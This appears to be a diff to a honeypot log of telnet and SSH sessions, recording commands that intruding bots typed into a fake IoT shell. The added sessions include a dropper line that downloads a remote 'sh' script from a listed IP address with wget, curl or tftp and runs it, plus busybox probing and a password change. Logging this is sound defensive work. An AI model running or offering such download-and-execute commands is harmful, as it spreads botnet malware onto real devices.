@@ -6,9 +6,9 @@ session: 9a50cd5862c8
 	duration 2 sec
 
 CMD:
-  system
-  enable
-  shell
+	enable
+  	system(cnf)
+  shell(cnf)
   sh
   cat /proc/mounts; /bin/busybox LSMRW
   tftp; wget; /bin/busybox LSMRW
@@ -27,7 +27,7 @@ session: 87a6c8f2c579
 CMD:
 	enable
 	system(cnf)
-	shell
+	shell(cnf)
 	sh
 	cat /proc/mounts; /bin/busybox VSHRM
 	cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox VSHRM
@@ -42,3 +42,35 @@ session: 103b371dd226
 	ssh 2222
 	time 2024-03-11 15:13:50
 	duration 47 sec
+CMD:
+	enable
+	system(cnf)
+	shell(cnf)
+	sh
+	linuxshell(cnf)
+	cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai
+	rm -rf sh; wget http://185.191.124.171/scripts/sh || curl -O http://185.191.124.171/scripts/sh || tftp 			185.191.124.171 -c get sh || tftp -g -r sh 185.191.124.171; chmod 777 sh;./sh ssh; rm -rf sh
+
+
+session: c0f3406878dc
+	src_ip 91.245.156.104
+	src_port 1506
+	telnet 2223
+	time 2024-03-04 03:51:20
+	duration 10 sec
+CMD:
+	start(cnf)
+	config terminal(cnf)
+	enable
+	system(cnf)
+	linuxshell(cnf)
+	shell(cnf)
+	sh
+	echo -e '\x69\x6D\x66\x75\x6F'
+	#cowrie.command.success message INPUT (passwd): adminpass
+	passwd
+	#cowrie.command.success message INPUT (passwd): adminpass
+	cat /bin/ls|more (cnf)
+	cd /tmp || cd /var || cd /dev || cd /etc
+	cat /bin/ls|head -n 1
+
